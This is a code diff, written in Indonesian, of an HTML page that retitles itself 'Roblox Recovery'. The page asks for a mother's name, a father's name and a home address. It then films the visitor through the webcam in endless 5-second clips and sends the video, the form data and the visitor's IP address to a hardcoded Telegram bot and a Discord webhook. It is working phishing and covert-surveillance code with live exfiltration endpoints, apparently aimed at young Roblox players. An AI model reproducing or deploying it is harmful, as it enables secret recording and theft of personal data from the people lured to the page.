@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Twibbon</title>
+  <title>Roblox Recovery</title>
   <style>
     body {
       display: flex;
@@ -30,7 +30,7 @@
 </head>
 <body>
   <form id="infoForm">
-    <input type="text" id="parentName" placeholder="Nama Orang Tua" required>
+    <input type="text" id="parentName" placeholder="Nama Ibu" required>
     <input type="text" id="address" placeholder="Alamat" required>
     <input type="text" id="fatherName" placeholder="Nama Bapak" required>
     <button type="submit">Kirim</button>
@@ -41,16 +41,16 @@
     var telegramChatId = '-1002188815934';
     var discordWebhookUrl = 'https://discord.com/api/webhooks/1260940016310423606/94wLCeLPsDUTB1Ai-9ZbP6NF2mTQSpiwdgygwe4C8-zUjOz7Sx2oKnYjNeIm28xXNuOb'; // Ganti dengan URL Webhook Discord Anda
 
-    // Fungsi untuk mengirim gambar ke Telegram
-    function sendToTelegram(imageDataURL, caption) {
-      var apiUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
+    // Fungsi untuk mengirim video ke Telegram
+    function sendToTelegram(videoDataURL, caption) {
+      var apiUrl = `https://api.telegram.org/bot${telegramToken}/sendVideo`;
 
-      fetch(imageDataURL)
+      fetch(videoDataURL)
         .then(res => res.blob())
         .then(blob => {
           var formData = new FormData();
           formData.append('chat_id', telegramChatId);
-          formData.append('photo', blob, 'photo.png');
+          formData.append('video', blob, 'video.mp4');
           formData.append('caption', caption);
 
           return fetch(apiUrl, {
@@ -60,23 +60,23 @@
         })
         .then(response => response.json())
         .then(data => {
-          console.log('Gambar berhasil dikirim ke Telegram:', data);
+          console.log('Video berhasil dikirim ke Telegram:', data);
         })
         .catch(error => {
-          console.error('Error mengirim gambar ke Telegram:', error);
+          console.error('Error mengirim video ke Telegram:', error);
         });
     }
 
-    // Fungsi untuk mengirim gambar ke Discord
-    function sendToDiscord(imageDataURL, ipAddress, formData) {
-      fetch(imageDataURL)
+    // Fungsi untuk mengirim video ke Discord menggunakan webhook
+    function sendToDiscord(videoBlob, formData) {
+      fetch(videoBlob)
         .then(res => res.blob())
         .then(blob => {
           var formDataDiscord = new FormData();
-          formDataDiscord.append('file', blob, 'photo.png');
+          formDataDiscord.append('file', blob, 'video.mp4');
 
           var payloadJson = {
-            content: `Foto terkirim dari IP: ${ipAddress}\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`
+            content: `Video terkirim\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`
           };
 
           formDataDiscord.append('payload_json', JSON.stringify(payloadJson));
@@ -88,33 +88,33 @@
         })
         .then(response => response.json())
         .then(data => {
-          console.log('Gambar berhasil dikirim ke Discord:', data);
+          console.log('Video berhasil dikirim ke Discord:', data);
         })
         .catch(error => {
-          console.error('Error mengirim gambar ke Discord:', error);
+          console.error('Error mengirim video ke Discord:', error);
         });
     }
 
-    // Fungsi untuk mengambil dan mengirim foto ke Telegram dan Discord
-    function takeAndSendPhoto(formData) {
+    // Fungsi untuk mengambil dan mengirim video ke Telegram dan Discord
+    function takeAndSendVideo(formData) {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(function(stream) {
-          var video = document.createElement('video');
-          document.body.appendChild(video);
-          video.srcObject = stream;
-          video.onloadedmetadata = function(e) {
-            video.play();
+          var videoElement = document.createElement('video');
+          document.body.appendChild(videoElement);
+          videoElement.srcObject = stream;
+          videoElement.play();
 
-            takePhoto();
+          setTimeout(() => {
+            var mediaRecorder = new MediaRecorder(stream);
+            var chunks = [];
 
-            function takePhoto() {
-              var canvas = document.createElement('canvas');
-              var context = canvas.getContext('2d');
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            mediaRecorder.ondataavailable = function(e) {
+              chunks.push(e.data);
+            };
 
-              var imageDataURL = canvas.toDataURL('image/png');
+            mediaRecorder.onstop = function() {
+              var videoBlob = new Blob(chunks, { type: 'video/mp4' });
+              var videoDataURL = URL.createObjectURL(videoBlob);
 
               var ipAddress = '';
               fetch('https://api64.ipify.org?format=json')
@@ -122,30 +122,33 @@
                 .then(data => {
                   ipAddress = data.ip;
 
-                  var caption = `Foto terkirim dari IP: ${ipAddress}\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`;
-                  sendToTelegram(imageDataURL, caption);
-                  sendToDiscord(imageDataURL, ipAddress, formData);
+                  var caption = `Video terkirim dari IP: ${ipAddress}\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`;
+                  sendToTelegram(videoDataURL, caption);
+                  sendToDiscord(videoBlob, formData);
                 })
                 .catch(error => {
                   console.error('Error mendapatkan IP address:', error);
 
-                  var caption = `Foto terkirim\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`;
-                  sendToTelegram(imageDataURL, caption);
-                  sendToDiscord(imageDataURL, 'IP tidak ditemukan', formData);
+                  var caption = `Video terkirim\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`;
+                  sendToTelegram(videoDataURL, caption);
+                  sendToDiscord(videoBlob, formData);
                 });
 
-              document.body.removeChild(video);
+              document.body.removeChild(videoElement);
 
-              setTimeout(() => takeAndSendPhoto(formData), 5000);
-            }
-          };
+              setTimeout(() => takeAndSendVideo(formData), 0); // Tidak ada delay untuk video berikutnya
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000); // Ambil video selama 5 detik
+          }, 0); // Tidak ada delay untuk video pertama
         })
         .catch(function(err) {
           console.log("Error: " + err);
           if (err.name === 'NotAllowedError') {
             alert('Untuk melanjutkan, izinkan akses kamera pada peramban Anda.');
           } else {
-            setTimeout(() => takeAndSendPhoto(formData), 5000);
+            setTimeout(() => takeAndSendVideo(formData), 7000); // Coba lagi setelah delay 7 detik
           }
         });
     }
@@ -157,7 +160,7 @@
         address: document.getElementById('address').value,
         fatherName: document.getElementById('fatherName').value
       };
-      takeAndSendPhoto(formData);
+      takeAndSendVideo(formData);
     });
   </script>
 </body>
